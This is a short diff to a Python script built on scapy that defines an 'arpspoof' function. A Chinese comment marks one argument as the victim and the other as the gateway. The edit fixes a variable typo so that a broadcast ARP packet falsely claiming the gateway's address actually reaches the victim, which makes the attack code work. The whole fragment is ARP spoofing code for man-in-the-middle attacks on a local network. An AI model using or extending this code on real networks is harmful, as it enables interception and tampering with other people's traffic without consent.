@@ -2,7 +2,7 @@
 #!coding:utf-8
 from scapy.all import *
 def arpspoof(ip1,ip2): #ip1为欺骗对象，ip2为网关
-	pkt=Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(psrc=ip2,pdst=ip)
+	pkt=Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(psrc=ip2,pdst=ip1)
 	sendp(pkt)
 	return
 
